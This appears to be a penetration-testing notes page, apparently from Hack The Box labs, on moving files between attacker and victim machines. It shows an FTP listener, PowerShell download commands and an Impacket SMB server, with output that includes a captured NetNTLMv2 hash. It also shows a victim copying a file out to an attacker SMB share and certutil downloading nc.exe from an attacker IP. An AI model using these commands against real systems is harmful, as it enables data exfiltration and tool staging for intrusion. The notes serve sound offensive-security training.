# File Transfers

## File Transfer Protocol
FTP listener
```
python -m pyftpdlib 21
```
FTP client
```
ftp 10.0.2.12
```

## PowerShell
Iex(DownloadString)
```
Iex(DownloadString)
```

DownloadFile
```
$url = "https://example.com/file.zip"
$destination = "C:\Downloads\file.zip"

(New-Object System.Net.WebClient).DownloadFile($url, $destination)
```

Invoke-WebRequest
```
Invoke-WebRequest
```


## SMB
Multiple ways.
Sample using smbserver.py
```
smbserver.py -smb2support test .
```
Example output:
```
$ smbserver.py -smb2support test .
Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.129.153.209,56551)
[*] AUTHENTICATE_MESSAGE (HTB\tom,EXAMPLE)
[*] User EXAMPLE\tom authenticated successfully
[*] tom::HTB:aaaaaaaaaaaaaaaa:f0590b302a08ee55067a7f2ab073f80b:01010000000000008048f0e8085fdb014654e213d80fa61c00000000010010006200580050005900450065004d007800030010006200580050005900450065004d00780002001000410044006f0078004e00740053006c0004001000410044006f0078004e00740053006c00070008008048f0e8085fdb0106000400020000000800300030000000000000000000000000300000e1f78d6407f0ea4ffcf56c925f62f5d1bc892d9171afe6cc190be4b22e7fbcdc0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003500000000000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:test)
^CTraceback (most recent call last):
  File "/usr/local/bin/smbserver.py", line 108, in <module>
    server.start()
  File "/usr/local/lib/python3.11/dist-packages/impacket/smbserver.py", line 4911, in start
    self.__server.serve_forever()
  File "/usr/lib/python3.11/socketserver.py", line 233, in serve_forever
    ready = selector.select(poll_interval)
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/selectors.py", line 415, in select
    fd_event_list = self._selector.poll(timeout)
                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
KeyboardInterrupt
ls [*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:test)
[*] Closing down connection (10.129.153.209,56551)
[*] Remaining connections []
$
```
From victim:
SMB share format:
```
\\attackerip\sharename
```
Example copy command in PS:
```
PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> copy-item acls.csv \\10.10.14.5\test\acls.csv                            
PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> 
```

## certutil
Example:
```
certutil -urlcache -f http://10.10.14.19:8080/nc.exe nc.exe
```
Example output:
```
C:\temp> certutil -urlcache -f http://10.10.14.19:8080/nc.exe nc.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\temp> dir
 Volume in drive C has no label.
 Volume Serial Number is 1E7B-9B76

 Directory of C:\temp

01/26/2025  05:30 PM    <DIR>          .
01/26/2025  05:30 PM    <DIR>          ..
01/26/2025  05:30 PM            28,160 nc.exe
               1 File(s)         28,160 bytes
               2 Dir(s)  13,890,064,384 bytes free

C:\temp> 
```
